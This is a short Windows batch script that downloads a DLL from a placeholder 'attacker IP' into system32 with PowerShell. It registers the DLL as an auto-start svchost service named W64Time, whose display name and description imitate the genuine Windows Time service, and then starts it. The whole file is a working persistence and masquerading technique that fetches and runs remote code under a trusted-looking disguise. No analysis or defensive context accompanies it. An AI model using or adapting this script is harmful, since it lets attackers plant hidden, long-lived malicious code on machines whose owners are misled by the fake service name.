@echo off
:: Define the attacker IP and download path
set "attacker_ip=x.x.x.x"
set "dll_path=%SystemRoot%\system32\w64time.dll"

:: Download the w64time.dll file
echo Downloading w64time.dll from %attacker_ip%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://%attacker_ip%/w64time.dll', '%dll_path%')"
if not exist "%dll_path%" (
    echo Failed to download w64time.dll.
    pause
    exit /b 1
)

:: Create the service
sc create W64Time binPath= "c:\windows\system32\svchost.exe -k TimeService" type= share start= auto

:: Set the display name and description
sc config W64Time DisplayName= "Windows 64 Time"
sc description W64Time "Maintains date and time synchronization on all clients and servers in the network. If this service is stopped, date and time synchronization will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start."

:: Register the service under svchost
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f

:: Set parameters for the service
reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%dll_path%" /f

:: Start the service
sc start W64Time

echo Service setup completed successfully.
pause
